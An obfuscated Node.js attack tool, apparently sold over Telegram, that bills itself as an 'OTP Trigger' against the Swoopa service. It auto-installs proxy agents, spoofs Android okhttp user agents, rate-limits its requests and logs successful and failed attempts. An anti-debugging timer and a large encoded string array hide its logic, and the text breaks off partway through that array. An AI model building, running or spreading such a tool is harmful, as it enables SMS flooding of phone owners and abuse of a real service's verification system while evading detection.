const fs = require('fs'),
  path = require("path"),
  {
    execSync
  } = require("child_process"),
  {
    isMainThread
  } = require("worker_threads");
if (isMainThread) {
  const requiredModules = ["https-proxy-agent", "socks-proxy-agent", "chalk"];
  let missingModules = false;
  for (const mod of requiredModules) {
    try {
      require.resolve(mod);
    } catch (v19) {
      missingModules = true;
      break;
    }
  }
  if (missingModules) {
    console.log("\n[SETUP] First time setup: Installing required dependencies...");
    try {
      const v20 = {};
      v20.stdio = "inherit", execSync("npm install https-proxy-agent socks-proxy-agent chalk@4", v20), console.log("[SETUP] Dependencies installed successfully!\n");
    } catch (v21) {
      console.error("[ERROR] Failed to install dependencies. Make sure Node.js and NPM are installed properly."), process.exit(1);
    }
  }
}
const http = require("http"),
  https = require("https"),
  zlib = require("zlib"),
  crypto = require("crypto"),
  chalk = require("chalk"),
  readline = require("readline"),
  {
    HttpsProxyAgent
  } = require("https-proxy-agent"),
  {
    SocksProxyAgent
  } = require("socks-proxy-agent");
let SUCCESSFUL_FILE = "successful.txt",
  FAILED_FILE = "failed.txt",
  DEBUG_FILE = "debug.txt";
function debugLog(v22, v23, v24) {
  try {
    const v25 = new Date().toISOString(),
      v26 = '[' + v25 + "] [" + v22 + "] [" + v23 + ']\x0a' + (typeof v24 === "object" ? JSON.stringify(v24, null, 2) : String(v24)) + '\x0a' + '─'.repeat(80) + '\x0a';
    fs.appendFileSync(DEBUG_FILE, v26, "utf8");
  } catch (v27) {}
}
const B = chalk.hex("#00A8FF"),
  C = chalk.hex("#FFD700"),
  Y = chalk.hex("#FF6B35"),
  W = chalk.white,
  G = chalk.gray,
  R = chalk.hex("#FF4466"),
  v1 = {};
v1.manu = "samsung", v1.model = "SM-G998B", v1.cpu = "exynos2100";
const v2 = {};
v2.manu = "samsung", v2.model = "SM-S901B", v2.cpu = "exynos2200";
const v3 = {};
v3.manu = "samsung", v3.model = "SM-S908B", v3.cpu = "exynos2200";
const v4 = {};
v4.manu = "samsung", v4.model = "SM-A525F", v4.cpu = "sm7125";
const v5 = {};
v5.manu = "samsung", v5.model = "SM-A536B", v5.cpu = "exynos1280";
const v6 = {};
v6.manu = "samsung", v6.model = "SM-A156E", v6.cpu = "mt6835";
const v7 = {};
v7.manu = "Xiaomi", v7.model = "M2101K6G", v7.cpu = "sm7150";
const v8 = {};
v8.manu = "Xiaomi", v8.model = "2201117TG", v8.cpu = "sm6225";
const v9 = {};
v9.manu = "Xiaomi", v9.model = "2109119DG", v9.cpu = "sm7325";
const v10 = {};
v10.manu = "OnePlus", v10.model = "ONEPLUS A6013", v10.cpu = "sdm845";
const v11 = {};
v11.manu = "OnePlus", v11.model = "KB2003", v11.cpu = "sm8250";
const v12 = {};
v12.manu = "Google", v12.model = "Pixel 6", v12.cpu = "tensor";
const v13 = {};
v13.manu = "Google", v13.model = "Pixel 7", v13.cpu = "tensor";
const v14 = {};
v14.manu = "Google", v14.model = "Pixel 8", v14.cpu = "tensor";
const v15 = {};
v15.manu = "Oppo", v15.model = "CPH2173", v15.cpu = "sm8350";
const v16 = {};
v16.manu = "Motorola", v16.model = "motorola edge 30", v16.cpu = "sm7325";
const v17 = {};
v17.manu = "vivo", v17.model = "V2109", v17.cpu = "mt6769";
const v18 = {};
v18.manu = "realme", v18.model = "RMX3363", v18.cpu = "sm7325";
const ANDROID_DEVICES = [v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16, v17, v18],
  OKHTTP_VERSIONS = ["4.9.3", "4.10.0", "4.11.0", "4.12.0", "4.12.0", "4.12.0"];
function getRandomDevice() {
  const v28 = ANDROID_DEVICES[Math.floor(Math.random() * ANDROID_DEVICES.length)],
    v29 = ['11', '12', '13', '14', '15'][Math.floor(Math.random() * 5)],
    v30 = OKHTTP_VERSIONS[Math.floor(Math.random() * OKHTTP_VERSIONS.length)];
  return "okhttp/" + v30;
}
(function () {
  let v31;
  try {
    const v32 = Function('return (function() {}.constructor("return this")( ));');
    v31 = v32();
  } catch (v33) {
    v31 = window;
  }
  v31.setInterval(fn2, 4000);
})();
const CHECK_KEY_POOL = [18, 19, 20, 20, 21, 22, 23, 24, 25];
function getCheckKey() {
  return CHECK_KEY_POOL[Math.floor(Math.random() * CHECK_KEY_POOL.length)];
}
function getRandomAppVersion() {
  const v34 = ["1.27.50", "1.27.51", "1.27.52", "1.27.53", "1.27.53", "1.27.53"];
  return v34[Math.floor(Math.random() * v34.length)];
}
function printHeader() {
  {
    process.stdout.write("[2J[3J[H");
    console.log(B("   _____                                    "));
    console.log(B("  / ___/      ______  ____  ____  ____ _    "));
    console.log(C("  \\__ \\ | /| / / __ \\/ __ \\/ __ \\/ __ `/    "));
    console.log(C(" ___/ / |/ |/ / /_/ / /_/ / /_/ / /_/ /     "));
    console.log(Y("/____/|__/|__/\\____/\\____/ .___/\\__,_/      "));
    console.log(Y("                        /_/                 \n"));
    console.log(W("┌──────────────────────────────────────────────┐"));
    console.log(W("│ [•] Author    : ") + B("NOT REXY                     ") + W('│'));
    console.log(W("│ [•] Telegram  : ") + C("t.me/Rex_OTP_Tool            ") + W('│'));
    console.log(W("│ [•] Status    : ") + G("Premium License              ") + W('│'));
    console.log(W("│ [•] Target    : ") + Y("Swoopa — OTP Trigger         ") + W('│'));
    console.log(W("│ [•] Version   : ") + B("SWP-V1.0.0                   ") + W('│'));
    console.log(W("└──────────────────────────────────────────────┘\n"));
  }
}
class NexaRateLimiter {
  constructor(v35) {
    this.delayMs = v35;
    this.queue = [], this.processing = false;
  }
  ["enqueue"](v36) {
    return new Promise((v37, v38) => {
      this.queue.push(async () => {
        try {
          v37(await v36());
        } catch (v39) {
          v38(v39);
        }
      });
      if (!this.processing) this._process();
    });
  }
  async ["_process"]() {
    this.processing = true;
    while (this.queue.length > 0) {
      const v40 = this.queue.shift();
      await v40(), await new Promise(v41 => setTimeout(v41, this.delayMs));
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(500);
function fn1() {
  const v42 = ['DhH0', 'uLHYqW', 't01qta', '8j+mKcbbDq', 'veTQtq', 'B3iOiG', 'ibTBoq', 'sKvhEq', 'kYKRkq', 'A0zhzq', 'v21SEG', 'xY98xW', 'qM9WqW', 'DwnJzq', 'qti1nG', 'q2fjtW', 'BIbtAq', 'v3nUrq', 'zYbpva', 'u0HbmG', 'sw5Kzq', 'u2vYDG', 'DMLRDW', 'Dw1euq', 'whfWEG', 'Bxrsyq', 'iokuGIa', '4Pwq4Pwq4Pwx', 'B25Jzq', 'wgXKrq', 'q2vfCW', 'Bffpua', 'ugLgAW', 'zguGyq', 'ifnLCW', 'yMXHyW', 'C2v0va', 'icGVCa', 'zMf1Ba', 'uNvHrq', 'Dg9juW', 'zM5YzG', 'ueDlDa', 'qMznrW', 'v0DSDa', 'rMX5AW', 'xY8Gia', 'wc1bCa', 'A2v5CW', 'igLUCW', 'r2fcBG', 'q2vfwa', 'tM8GAa', 'CvHVAa', 'Bca2', 'DgHVCG', 'vgzLqW', 'ucbMBa', 'v2TtyW', 'zNjVBq', 'A0HVtW', 'FdeYFa', 'BNvSBa', 'BMvS', 'z2HSDq', 'Es1HzW', 'zxjUyq', 'CIbPBG', 'u09xuG', 'EM5ovG', 'D0HzzW', 'vg9XvW', 'ifbvqG', 'rfviBW', 'lYaVxW', 'lI4k', 'x18Gia', 'quniqq', 'mxWZFa', 'DMHVza', 'ExP0tG', 'zwqGBW', 'CgfKuW', 'AgfIBa', 'BMDPzG', 'zeX4AW', 'BwuVCW', 'Fe9uua', 'ihn1CG', 'CwvzyW', 't01JAW', 'AKvIzG', 'C2vJDq', 'yxLmAa', 'yMvYia', 'ihvZzq', 'ANfrsG', 'z2v0CW', 'wwvdzq', 'CMvK', 'v0Leia', 'uMPxzG', 'ihT9', 'A0a0', 'vhf0ra', 'EsbMBW', 'iZu1nq', 'mti4xW', 'Eg5UCG', 'qvbjia', 'Dg5AuG', 'ndvTuMTvyu8', 'yM9Sza', 'twLJCG', 'ELLPsq', 'yxnL', 'se5xuG', 'uxvJrW', 'CLjqwa', 'zhnTsG', 'vJiXma', 'vMz0AG', 's0P1EG', 'nte5mtuYmejIuwP4BG', 'B2WGia', 'z0ritq', 'CK1Jyq', 'su1uua', 'AwnuBa', 'D2LktG', 'ufb1vW', 'AwmG', 'DgDMzG', 'tMzxEa', 'EeT1sa', 'EKD4sG', 'vu9brW', 'B2jKyW', 'qtyWmq', 'zxiGsW', 'lJuZ', 'Dg9vCa', 'w0vsuG', 'EsbdtW', 'B20Gva', 'BhrYBW', 'DhnxAq', 'zuXkBa', 'u0zWDa', 'kYKRja', 'lJuW', 'wZm2Bq', 'sfjJDG', 'zvn5BG', 'xY8GlG', 'Cwfyra', 'wKLqta', 'z1vjuW', 'twf6CW', '4PscifVIGki', 'DfrPBq', 'mZmZ', 'v21PCG', 'DhmGzG', 'Dw5SAq', 'mJu2', 'B21jza', 'Exb0BW', 'swnwvG', 'C3rkvq', 'i0zgnG', 'm3WXFa', 'v3LYrW', 'oIboDq', 'rNn5Ba', 'BKjYAq', 'icbCxW', 'zwqGza', 'ufrnCq', 'q1qGva', 'icaVia', 'uvPHyG', 'uKPhrq', 'mL9qCG', 'yNzOuW', 'ExfcqW', 'CKnwBG', 'AKz5sG', 'rhHICG', '4Psa4Psa4Psa4Psq', 'vw5RBG', 'j0Hlta', 'zvzNra', 'z2DQva', 'DMuGyG', 'mtn8ma', 'qwvgvq', 'u2HLBa', 'zM9Yrq', 'vvjdrq', 'su5tyW', 'z2jbDW', 'yxbWxW', 'v0zssG', 'BKvAtW', 'Dg9Rzq', 'Ec1WBa', 'DKziza', 'zw9KDq', 'rgvMyq', 'icPCka', 'ntyTrW', 'mJiWmq', 'DwuPlG', 'seeYnq', 'ywnL', 'qvbHyG', 'tM55Dq', 'Cc1WAa', 'C203mq', 'icdILztILza', 'y2vUCW', 'mte3va', 'BuTADW', 'q0Hkvq', 'yNL0zq', 'ihrHCG', 'wMLStG', 'z1nwra', 'C3vICW', 'mtC2lG', 'B2DVDW', 'tu5MtG', 'DK1sBa', 's2Lbzq', 'Cvbkqq', 'zNzUAq', 'vM5OBG', 'BwnyEG', 'BvLjyq', 'DxjLia', 'vujmsq', 'kcGOlG', 'y2uGvW', 'mtf8mq', 'DhvYzq', 'DffTEq', 'y291BG', 'wMTowG', 'q3fTtq', 'vvjdva', 'sxPQAW', 'A2LSBa', 'CeTJuG', 'wZeVmq', 'tvzizq', 'vhnTwa', 'B2XvqW', 'ucbqyq', 'A0zzsq', 'uezprG', 'BMPVBG', 'tMXAEG', 'u2TYAG', '4PYxievY', 'wMzfAq', 'CZOVlW', 'zY4UlG', 'zwH1Ba', 'wfD2Da', 'DMvYAq', 'DNPmzG', 'ttPCuW', 'Aw1Lia', 'ww1stW', 'u3HJDG', 'BgWGFa', 'rhLSvW', 'ignVBG', 'wNDmEq', 'wwvZla', 'teXoBa', 'zMHHCq', 'wK5bwG', 'DMvKlG', 'zNrZwG', 's0vzlq', 'rKnuuq', 'CuTQDW', 'CNnPBW', 'D2vjyq', 'zw1PDa', 'ifrYAq', 'ChvZAa', 'zM9YBq', 'y0flBa', 's1rWBW', 'kev4Da', 'DxjPBG', 'seT4vW', 'v0j4Aa', 'tNvdtG', 'vhjPzW', 'ANjpzq', 'AKPhva', 'zK5xvq', 'yMHNta', 'vcbMyq', 'CgeG4Ocu', 'CgHVBG', 'AxjQvW', 'thbhAq', 'BMznva', 'CMvSzq', 'sfDjAq', 'q0TkwG', 'Effbwa', 'lxPblq', 'wNrYCa', 'swjswa', 'xsbuzq', 'AwqGCa', 'BM93', 'DwnWva', 'wgjdDG', 'oIbsDq', 'q2Pyrq', 'CMvWBa', 'ndG1wa', 'su4Gua', 'BNnlvG', 'u3DWuG', 'tLfItq', 'BgvUzW', 'rgLZCa', 'C3DVBW', 'tgvUzW', 'yK5lsG', 'zxf1zq', 'zu1qsq', 'zKXqtq', 'ifrVAW', 'x19FxW', 'r2zeEq', 'z3jHEq', 'B1fWBa', 'BMTtEq', 'C3rKBW', 'B3jPzW', 'CYbSBW', 'q1rRAq', 'ihvUza', 'DgLvyG', 'CMf5', 'y0viDq', 'zsbSyq', 'z1fmDW', 'vgXzsG', 'CMvHBa', 'icbB', 'vuXbBq', 'CIbUzq', 'EMPUza', 't05fua', 'DxrMoa', 'Aezcza', 'zxrLyW', 'mJrVwLPLBfO', 'ieHxsq', 'y2HHAq', 'r29VzW', 'zxbOuW', 'jg1Iia', 'BMnLlG', 'rLvZva', 'uKvhsq', 'ifnPBa', 'm3WYFa', 'r1vUvG', 'Dwz0Eq', 'BKfWDW', 'C3qGDa', 'zwPhBq', 'AwnHDa', 'igvKzW', 'mta2mZGWnKzvrw5QtG', 'zw4GBa', 'AKzzAG', 'CKfJDa', 't3jszq', 'ywn0Aq', 'uwHywq', 'CIbqCG', 'mJGTrW', 'u2f2zq', 'zMXLra', 'x1nftG', 'sNnmzW', 'zuPzCq', 'y29UyW', 'AgLZiG', 'CMfsuW', 'EfjmBG', 'FcbLyW', 'tM5vDG', 'iokCLYbt', 'yKPhuW', 'y1PsyW', 'rNbnsq', 'iokgKIa', 'veXbuq', 't1rqia', 'DxiGsa', 'ywXPza', 'icboBW', 'ELbyrW', 'Bxq2oa', 'Eu5Uwq', 'zxf1Aq', 'nZaW', 'uLzoyq', 'A1jVzG', 'B3n0lG', 'v3Lxzq', 'tMXVzq', 'C204mW', 'zeXvsW', 'C3rHDa', 'EgD2uW', 'C3rHBa', 'r1nesW', 'EwvZ', 'DcbSzq', 't3zYuW', 'B3bHFa', 'u3PMCG', 'muS2rW', 'quH3Dq', 'sKr5uG', 'wwfnqW', 'vxLKtW', 'EsbfCG', 'qvngCG', 'rwfxsG', 'CM4Gka', 'zhmGka', 't25Lua', 'rs1suW', 'rLfUDG', 'ruDPtq', 'yxvSDa', 'CIbYyq', 'yLD2uG', 'u1vpBa', 'z3jHCa', 'CMvHyW', 't0zuvW', 'nc4Xma', 'jgrPCW', 'tK9fsW', 'mxW0Fa', 'B21cEq', 'zgf0Aq', 'v213qW', 'tLPOtq', 'vKHNCq', 'D0TTzG', 'rwn6Dq', 'rfbSrq', 'u3jOtG', 'C2jxBW', 'ugDTAq', 'CYa6ia', 'ugzwra', 'rKzABa', 'ifnxtW', 'uuX5Ca', 'veTPBG', 'zxj2zq', 'wMzfDa', 'rfvIBW', 'zwqGDa', 'zw4Uia', 'wvD4AG', 'psaOrW', 'Ae5Jsa', 'mJaTua', 'z0TVva', 'zxiGmG', 'ieXPBq', 'C3rHBq', 'vwTfvq', 'D29YAW', 'A21hCW', 'Aw51zq', 'BgqGBG', 'mtCZ', 'icGOja', 'tu5qua', 'qwrKia', 'uffXCW', 'AKr2CW', 'mtyYna', 't0r5za', 'vvrKwa', 'C204mG', 'AhnXCW', 'C3rHBG', '4Psm4Psa4Psa4Psa', 'DhzzDa', 'C0fTwG', 'C3nMDq', 'Aw1jBG', 'BM9Uzq', 'zfnnqG', 'ienVBG', 'CfPsuG', 'Aw5KBW', 'iezPCG', 'tvvrDa', 'ChH3uG', 'C0zZDG', 'iokUNIa', 'B2DPyW', 'CYbgAq', 'CIboDq', 'B25Fzq', 'DMTOra', 'ifDPBG', 'ifrPBq', 'CNvJDa', 'zMjNEa', 'tfDZyW', 'zcdIGjqG', 'EhPsta', 'svPjCW', 'zxvL', 'wNfWDa', 'sg93ia', 'wNP5yq', 'C1z4CG', 'Dgf0Dq', 'x1bpta', 'zfn0qW', 'zxjZrG', 'ienVDq', 'BMLKtq', 'vg90yq', 'BwfW', 'g1Ti', 'zxbfAa', 'qwHNvq', 'wvP5rq', 'BNrPBG', 'DwWUDa', 'ChqTzq', 'q3vZDa', 'yMPLyW', 'tMTiyq', 'ywrKta', 'B2PlAq', 'u00Tqq', 'AMHrDq', 'Exj6uG', 'C3nPBW', 'wwf4yq', 'C2v0sq', 'l3yXlW', 'oLTHlq', 'ihrVia', 'lIbfEa', 'r0z1AG', 'uhbLvq', 'AvfStq', 'whbhBq', 'AhvhEa', 'tevsva', 'z2PctG', 'DgL2zq', 'DcaTrG', 'ihrYEq', 'quvtxW', 'icaGgW', 'ww5ADa', 'D2fYzq', 'yMvYCW', 'C202mG', 'DKHmva', 'lM5LEa', 'yLb4zW', 'EfHQDa', 'l19FxW', 'wK5xsG', 'zcb0Aa', 'zw5LCG', '4Psu4Psa4Psa4Psa', 'rNruCa', 'Dw1Izq', 'zxbLBG', 'zg93BG', 'l2v0yW', 'DuLTDG', 'vfaGva', 'zsb8ia', 'u1vXuq', 'zNvUyW', 'Dhb1Da', 'DgvZDa', 'Ce91uW', 'D0jpEa', 'rcbiqq', 'CKLKoW', 'zNDZAW', 'r0XmrW', 'iev4Aq', 'B0DIEq', 'rMTjEq', 'AwXLza', 'ieXPyW', 'B01MCq', 'wZmZBq', 'BwLU', 'ihnLyW', 'y2vjra', 'yKj5sa', 'zLntDq', 'igzYBW', 'z29vAa', 'Ag9HtW', 'BcbuAq', 'q3vvwG', 'C2uGAq', 'ls0ktq', 'zu9IAG', 'qvnJCG', 'BMrgAq', 'ihLVDq', 't2jvEa', 'xYrDwW', 'zMXVBW', 'DgvZ', 'y2fiBa', 'Ee1jwq', 'CKr5vq', 'yNzovW', 'CMvTzq', 'A3jkta', 'igv4zq', 'CMLHBa', 'AuHorq', 'z3zkDq', 'ie51Bq', 'veXtxW', 'qKL2Dq', 'BhLdBW', 'BNrLCG', 'wunStW', 'BKffDa', 'Dg9Y', 'tvvOvq', 'isbqBa', 'luDdtq', 'vxjhzG', 'BhvZ', 'CMvZDq', 'rKPnAq', 'u2vSzq', 'ifrVBW', 'BNbTia', 'yuz6qq', 'C2vYDG', 'ywnJzq', 'BNzwrW', 'Bca4', 'ywDL', 'icbqCG', 'AM9PBG', 'yMXmsG', 'zcaOva', 'Cc1wzq', 'vKfyyq', 'ierPCW', 'ihzLCG', 'DMfSDq', 'vKTZBG', 'r0niDa', 'AYWKBq', 'xsbuBW', 'Cgf0Aa', 'v1Ljsa', 'z25NDq', 'q2fWDa', 'svLbAW', 'zcbZyq', 'y05yvq', 'zM9WAW', 's0rUDa', 'uxLVuW', 'vJeUma', 'r0jeCa', 'nv9tsa', 'vM5uwq', 'uMf0zq', 'xYbGlW', 'mNWXmW', 'DwrLCW', 'z21Rua', 'yvv6DG', 'qwjWDa', 'zwn0Aq', 'y2jjtW', 'venjDa', 'CMfUza', 'Axnuva', 'DMTXsG', 'vMP2zq', 'vtDqyW', 'wc1qBa', 'DgvKia', 'drTBsW', 'iZaWqq', 'iokgUYbt', 'y2f0yW', 'BK5LuW', 'DgvNCG', 'mtK6ua', 'cLTtrq', 'zgX0sW', 'qKjArG', 'q0DPDG', 'BfbKEG', 'zxjIrW', 'CM4GDa', 'y1bLra', 'Cvz2Dq', 'vvPwwq', 'u2nYyq', 'z3vUEG', 'tKCT', '4PYxifnH', 'rcaGia', 'lvniqq', 'veXtDG', 'z3rlwa', 'wNz3rG', 'BMDLia', 'uhnUuq', 'rxnkDW', 'tMPtCq', 'zs5NlG', 'Dg90yq', 'Ew54sW', 'ANnKEq', 'uvLesW', 'lxnLCW', 'AxmGyW', 'BxHTDG', 'ufzgzG', 'yuvbvW', 'AeLmEa', 'ig9Uia', 'weX2DW', 'EgvK', 'zg9hqG', 'C2SGlq', 'ywjSzq', 'zw91Da', 'zxzLEG', 'BMv4yq', 'pvWNqW', 'vuDtzW', 'uNLMCG', 'B2yGDa', 'CgeGtW', 'osKG4Ocu', 'uhjLBq', 'EvbhtW', 'sgLzwa', 'u2vJyq', 'iZmZmW', 'ucbMBW', 'zgvIDq', 'D0vPvG', 'yLDowa', 'ig51Bq', 'zgTvwq', 'BMP3qq', 'zY4Gmq', 'igDLDa', 'sgfYza', 'zxiGCG', 't1jDia', 'CeLrwq', 'rhD0DG', 'tMfutG', 'B2H5wa', 'qMfTta', 'zxjZlG', 'sxryqW', '4Pwq4Pwq4Pwq4Pwx', 'Aw5WDq', 'ihjLCW', 'CvvnCW', 'thHtEa', 'yNblAG', 'wKLWtG', 'BgXPBG', 'zwjjsG', 'ywTRBa', 'DgvUCW', 'z2XfvW', 'lI4UcG', 'De5NEa', 'oLWNjW', 'icdILze', 'y3b1CW', 'vLPjtG', 'tKPfvW', 'yvLbvW', 'DLHjsa', 'zsaODa', 'BgLezq', 'r3vRDG', 'B3DLCG', 'nti1rG', 'BwfPBG', 'r21nsG', 'DgLXDq', 'tKvQyq', 'ntaGva', 'ugLcwq', 'qvjfxa', 'yIKGlq', 'sLroDG', 'rw50zq', 'Bwf0yW', 'zcbMCG', 'Dw5N', 't3zIEG', 'CM9Yia', 'uMv0CG', 'qvbfvG', 'ic0Tlq', 'tenSCq', 'sfHLCq', 'zYbbyW', 'twXjEq', 'BgvUDa', 'vxHSEa', 'Dg9gAq', 'Awz5', 'zguUAG', 'xsbwzq', 'mtmXndq1nwPNCKfLCW', 'wxrfwG', 'zMzPyW', 'u0HbmW', 'D3nCuW', 'BIbWAq', 'CM92Aq', 'CI4Grq', 'w1nfva', 'wxniAa', 'B24GCW', 'CgvUza', 'qLbpyG', 'Eg1xzW', 'tMTWAG', 'zwqGka', 'zhbVAq', 'lwfNzq', 'qMHnuq', 'CxvPCG', 'lti1nG', 'BwjLCG', 'AxnbCG', 'zs4k', 'v0LTDq', 'ica6ia', 'twvtAa', 'yxrLCG', 'Bw90BW', 'C1Hqwq', 'y0LitW', 'CuLRzG', 'CIbozq', 'zxrJAa', 'vMvYAq', 'ywXeAq', 'wNvsza', 'Ahr0Ca', 'EhbUzq', 'CfjIwG', 'v0v2tW', 'i0zgra', 'wNrPqq', 'ttiXma', 'EhKGsq', 'BK9dua', 'B3DUqW', 't1zVqW', 'B3DZua', 'yMD1qW', 'BtmYxa', 'BMLUzW', 'rMLdDG', 'y3qTtW', 'jgnWDq', 'AwqGmG', 'DgvKkq', 'u3PztW', 'Aw5N', 'AwnLBG', 'BIaGia', 'C2vHCG', 'DMfSAq', 'B25Uzq', 'ywnO', 'y3jLyq', 'ks5tzq', 'rvvdqW', 'y3j5Ca', 'C0XOsW', 'vePzra', 'vxnLCG', 'g1SZsG', 'Dfn5BW', 'keXLyq', 'pt09ia', 'AM93Cq', 'Bsbozq', 'ota4qG', 'qKzmwa', 'CK5vua', 'igfSCG', 'A0r0yG', 'wfzruW', 'B09ksW', 'mtG4lG', 'BvbAAW', 'q2Xuva', 'q29UzG', 'rNHRAq', 'sLHvBG', 'thfrzG', 'Bg9N', 'ALDPvW', 'CMvZBW', 'u1nqvG', 'zY4GmG', 'yxrJAa', 'rMv6qG', 'D1Pfyq', 'v1L6Ba', 'u2vbEq', 'vMDlCa', 'B1PxsG', 'BvfKCa', 'EKeTwG', 'ys5JBW', 'z2DLCG', 'igLUAG', 'yLj6BW', 'rKfuqq', 'q0vJqq', 'sg5mAq', 'u2LSzq', 'wfGPoG', 'CNHyCW', 'DLzgtG', 'ls0Tlq', 'tsbHCG', 'rMfZDa', 'uM5gCq', 'ywDLBG', 'yxbPsW', 'wwjzvW', 'EgXKrG', 'v1P5yG', 'AfjSBG', 't2HtwG', 'DgfJDa', 'EsbYzq', 'tNzNsa', 'BNf2yG', 'y29TCa', 'BNntra', 'iokCPIbt', 'yxbWzq', 'x0jHCW', 'C2PIBG', 'DgvYBG', 'sfD1ta', 'u1Dqlq', 'B1nHvG', 'y3rPBW', 'BKjfra', 'ms4WlG', 'BwjUza', 'CwPvEG', 'BfX2mq', 'y3b1la', 'swXuCq', 'sNPmqW', 'zhbHta', 'Aff5DG', 'tK9uia', 'D2Lfyq', 'wMTUyq', 'vhjLzG', 'DgvdBW', 'C3vJyW', 'vu1crq', 'ievYCG', 'rfrWzW', 'yNrzzG', 'u1njtW', 'lJaGia', 'Fhn3BW', 'vw1dyq', 'Cgf1CW', 'jg1Nia', 'zsbPBG', 'igzPBa', 'uu5nra', 'mNW0Fa', 'uMPcyq', 'rM91BG', 'B2v3Cq', 'DNnWwq', 'wvjwsG', 'B25Lxq', 'DKX4tq', 'icdILzRILza', 'B2LKxW', 'x2TPBG', 'y3v0Aq', 'seeZoa', 'mZG0', 'FcaVFa', 'mZa1', 'zw5JBW', 'DwXOrG', 'sLDOCW', 'rePSqq', 'yxbWBa', 'icHUDq', 'CMnotW', 'D3fbDG', 'BguGua', 'As9HyW', 'uKLArq', 'D1zxtG', 'zY50Ea', 'cIaG4PYx', 'BMv0DW', 'B1DNAG', 'r1fgvG', 'txrmsa', 'iefjia', 'BwvZCW', 'xf9FxW', 'Bwf4', 'ufvqvq', 'qwjoDa', 'BMfTzq', 've1qqG', 'wuP0za', 'ig1HBG', 'DNvhrW', 'tMv4yq', 'yxrPBW', 'AMDNsG', 'CLfRsW', 'BwfUEq', 'D0TVzG', 'y3vZDa', 'lsbtqW', 'C1DMtq', 'ks4Grq', 'n3WXma', 'zxnZzq', 'tvj4wG', 's21tqq', 'xf9Fla', 'uKuG4Ocu', 's0zdDW', 'CMDOrq', 'icbtvW', 'BhzL', 'EvLnzW', 'sw15EG', 'z3jLzq', 'ue5kza', 'DezcBG', 'qMrwsG', 'DgLTzq', 'y3LHBG', 'tgzXBq', 'EvHUvq', 'v0j2zq', 'ic1fCG', 'CM1rrW', 'DgHPCW', 'rgvSzq', 'yK9UDq', 'BfPcza', 'y0T2CW', 'BgfUAW', 'zLfdqq', 'BNfdzG', 'rhrrAG', 'uvjUCG', 'y0LRzq', 'zw5KCW', 'vfDoBq', 'BfPMuW', 'DfPHEa', 'u0vmrq', 'BfflqG', 'rxHWqq', 'B2jSrq', 'Aw1Rua', 'Cg9YDa', 'Dg8GCG', 'DML2BW', 'runuia', 'w2rLzG', 'yxjKDW', 'tLPlzq', 'ywrZia', 'ywXSia', 'zgLUzW', 'yLvQra', 'thPYsq', 'DgHztq', 'icaG4PYx', 'Bg1LBq', 'vfPXrG', 'ywj6BW', 'vfvqxq', 'ssblzq', 'rwjpEq', 'sgvSCG', 'i0zgna', 'Dg9tDa', 'sgnxsa', 'Bs9HCa', 'su12tq', 'icdILzeG', 'ww1hva', 'Euvbsq', 'Eufqsq', 't1rqoG', 'zxD0yq', 'zw5XDq', 'wdi1nq', 'rgPnuq', 'qLnXtG', 's1bmCW', 'tNDrsq', 'AwzPyW', 'ufPzra', 'vhDpAq', 'B2jgEq', 'qKTXwa', 'nNWZFa', 'r3nWCa', 't1ffvG', 'Bwvtzq', 'C3rYAq', 'AvLQBG', 'EwHoCW', 'C3nPBG', 'lIbqBa', 'oIb0lG', 'tM9suG', 't1fsqq', 'yMvqwG', 'wMP2uq', 'wu1bEa', 'ELrKuq', 'zxHPDa', 'AKTIEa', 'yw0Gia', 'mJeWoq', 'BM9YBq', 'CNrUDq', 'yuHIza', 'qwLyra', 's3LZBa', 'uuLUDa', 'zxiGka', 'icaG', 'r1DVwG', 'C0Tgrq', 'vhjbyW', 'rffRBq', 'igvYCG', 'EwTjtW', 'zLbsqG', 'q09otG', 'qwDyuG', 'r1bdvW', 'se1hwq', 'sw5ZDa', 'A0rxsa', 'Aw9UlW', 'zxiGjW', 'EgLLCW', 'CMfUzW', 'CNv5uW', 'Egr2Dq', 'DI9UDq', 'vgLTzq', 'A25kva', 'swzSCW', 'z2v0', 'sfruua', 'DMjUrG', 'qZPCvW', 'yw9IrW', 'y1PTuG', 'DwfLwG', 'lJbCCa', 'l3bPBG', 'twTctG', 'DgHYBW', 'CKDnvq', 'mZjFta', 'vezABq', 'AerPsG', 'BMXVyq', 'kcKG', 'z3nnsG', 'yMXHsq', 'EhzNAG', 'vfPpDW', 'wuPQvG', 'DNPjrG', 'revcvq', 'zxiGmW', 'EunVBG', 'B1LsCW', 'ANLUrG', 'BNnLza', 'C2uGyW', 'yxr1CW', 'Cu1Sza', 'uMrwDq', 'lIbbyG', 'EvbXyW', 'C2rToa', 'rerSuq', 'DeXyEG', 'B3mXmG', 'iefIBW', 'yMfUBG', 'thvADW', 'zxnZ', 'ihrOAq', 'u0TjtG', 'lwLK', 'ANnTCG', 'v3H1sG', 'zgXmsW', 'uIbttW', 'rYbtrq', 'uKnmCq', 'v0LeoG', 'A1LLEG', 's2LUzW', 'B1rkAa', 'qvnJsa', 'zhLAEa', 'BYbPBG', 'AMn0zq', 'DgvUyq', 'icaGxW', 'sgTiBW', 'y29Yvq', 'xYbClW', 'wfr0Aa', 'ieLUDa', 'rKrpzG', 'CgvfqG', 'BMv0', 'qJm1', 'u1z5wG', 'CIbJDq', 'zw5KlG', 'Aw5NlG', 'CMv0Dq', 'oIbUDq', 'DKPRvq', 'rvHbia', 'yw5KCG', 'qNbADa', 'Ag9ZDa', 'tLPntG', 'zvzNza', 'zxqTqW', 'Buj1Aq', 'BgvtEq', 'B2LK', 'mtm3lG', 'mhWZFa', 'wwvqrq', 'A0XkCq', 'xcTCkW', 'weDdnW', 'DfLPva', 'uvn6Aa', 'C2HHmG', 'icaGia', 'y29Kzq', 'xsbbDq', 'wwvZ', 'Fdf8mW', 'D0zrAW', 'seTbDG', 'zuLrAW', 'rxzLBG', 'z05nwG', 'Bw9usW', 'AePwDq', 'DezjwG', 'AwfuCq', 'u1rfuG', 'ue9tva', 'u0nmyW', 'CfDTDq', 'zfDREG', 'rwzkqq', 'CNPYAa', 'wteZma', 'AfzpCW', 'BNvTyG', 'y2fWDa', 'BIbVCG', 'yY9JCa', 'ifnLCG', 'zxjfBG', 'tfndDW', 'rxfNBq', 'C2uGuW', 'zgf0yq', 'qxmZBW', 'yLP1rW', 'zwn0zq', 'ELPUEa', 't1rsCW', 'CY1WCG', 'AKLhsa', 'mdaWma', 'veztuW', 'rezpuq', 'u3DVBW', '4PYtifrH', 'C2firG', 'nhWXFa', 'wNHdyW', 